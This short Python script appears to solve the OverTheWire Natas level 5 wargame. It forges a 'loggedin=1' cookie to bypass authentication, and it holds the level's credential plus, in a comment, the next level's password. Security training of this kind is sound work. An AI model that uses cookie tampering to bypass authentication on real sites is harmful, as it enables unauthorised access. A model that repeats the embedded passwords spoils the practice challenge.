#!/usr/bin/env python

import requests

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

# headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = "http://%s.natas.labs.overthewire.org/index.php" % username

session = requests.Session()

cookie = {"loggedin": "1"}

response = session.get(url, auth=(username, password), cookies=cookie)
content = response.text

print(content)

# here we are able to login using a cookie, so we need to check the cookies of our session
# there was a cookie { "loggedin": "0" }, so we tried to change it and we did it right
# the password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
